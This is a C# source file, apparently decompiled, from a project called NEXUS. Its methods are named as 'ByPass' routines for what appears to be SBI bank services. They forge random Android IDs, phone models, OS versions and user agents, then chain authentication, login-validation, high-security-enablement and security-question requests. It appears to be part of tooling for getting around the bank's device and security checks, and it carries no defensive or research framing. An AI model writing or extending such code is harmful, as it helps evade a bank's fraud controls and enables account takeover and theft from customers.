using System;

namespace NEXUS;

internal class SbiService
{
	public SBIPaymentRequest SBIByPassAuthServiceRequest()
	{
		SBIPaymentRequest sBIPaymentRequest = new SBIPaymentRequest();
		try
		{
			sBIPaymentRequest.androidId = PhoneUtils.GetRandomAndroidId();
			sBIPaymentRequest.phoneModel = PhoneUtils.GetRandomModel();
			SBIPaymentRequest sBIPaymentRequest2 = sBIPaymentRequest;
			string text = "URLConnection/android/";
			sBIPaymentRequest2.userAgent = text + sBIPaymentRequest.phoneModel;
			sBIPaymentRequest.osVersion = PhoneUtils.GetRandomAndroidOs();
			SbiSecureServiceV2 sbiSecureServiceV = new SbiSecureServiceV2();
			sBIPaymentRequest = sbiSecureServiceV.authServiceRequest(sBIPaymentRequest);
			if (sBIPaymentRequest.currentStatus)
			{
				sBIPaymentRequest = sbiSecureServiceV.fetchDateTimeRequest(sBIPaymentRequest);
			}
		}
		catch (Exception ex)
		{
			string text2 = "SBIByPassAuthServiceRequest Exception: ";
			string message = ex.Message;
			string text3 = " -  ";
			Console.WriteLine(text2 + message + text3 + ex.StackTrace);
		}
		return sBIPaymentRequest;
	}

	public SBIPaymentRequest SBIByPassSecurityServiceRequest(SBIPaymentRequest sbiPaymentRequest)
	{
		try
		{
			SbiSecureServiceV2 sbiSecureServiceV = new SbiSecureServiceV2();
			sbiPaymentRequest = sbiSecureServiceV.securityServiceRequest(sbiPaymentRequest);
			sbiPaymentRequest = sbiSecureServiceV.loginValidateRequest(sbiPaymentRequest);
			sbiPaymentRequest = sbiSecureServiceV.enableHighSecurityServiceRequest(sbiPaymentRequest);
		}
		catch (Exception ex)
		{
			string text = "SBIByPassSecurityServiceRequest Exception: ";
			string message = ex.Message;
			string text2 = " -  ";
			Console.WriteLine(text + message + text2 + ex.StackTrace);
		}
		return sbiPaymentRequest;
	}

	public SBIPaymentRequest SBIByPassEnableHighSecurityConfirmServiceRequest(SBIPaymentRequest sbiPaymentRequest)
	{
		try
		{
			SbiSecureServiceV2 sbiSecureServiceV = new SbiSecureServiceV2();
			sbiSecureServiceV.enableHighSecurityConfirmServiceRequest(sbiPaymentRequest);
			sbiSecureServiceV.questionSubmitServiceRequest(sbiPaymentRequest);
		}
		catch (Exception ex)
		{
			string text = " SBIByPassSecurityServiceRequest Exception: ";
			string message = ex.Message;
			string text2 = " -  ";
			Console.WriteLine(text + message + text2 + ex.StackTrace);
		}
		return sbiPaymentRequest;
	}
}
